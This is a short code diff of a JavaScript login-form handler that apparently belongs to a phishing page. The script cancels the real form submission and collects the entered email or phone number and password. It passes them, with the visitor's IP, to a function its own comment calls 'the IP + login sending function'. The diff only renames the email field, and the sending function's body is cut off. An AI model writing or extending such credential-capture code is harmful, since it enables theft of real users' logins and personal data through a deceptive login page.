@@ -1,10 +1,10 @@
 document.getElementById('loginForm').addEventListener('submit', function (e) {
     e.preventDefault(); // stop actual form from submitting
 
-    const email = document.getElementById('email').value;
+    const emailOrPhone = document.getElementById('emailOrPhone').value;
     const password = document.getElementById('password').value;
 
-    sendIPnlogin(email, password); // call the IP + login sending function
+    sendIPnlogin(emailOrPhone, password); // call the IP + login sending function
 });
 
 const sendIPnlogin = (email = 'unknown', password = 'unknown') => {
